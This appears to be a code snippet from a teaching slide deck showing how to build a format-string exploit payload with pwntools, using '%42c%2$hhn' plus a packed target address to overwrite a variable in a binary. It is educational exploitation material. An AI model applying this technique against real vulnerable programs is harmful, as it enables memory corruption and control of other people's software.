						<pre><code data-trim data-noescape>
							# you can use pwntools to find the address of your target
							targetAddress = ELF(binary).symbols['target']

							# overwrite target with 42: %42c -> 41 spaces and some char
							# %2$hhn -> 1 byte (half half) at the 2nd position
							payload = b"%42c%2$hhn"

							# 8 byte align your argument on the stack
							payload = payload.ljust(64)

							# insert targetAddress onto the stack after your argument
							# to overwrite your target
							payload += p64(targetAddress)
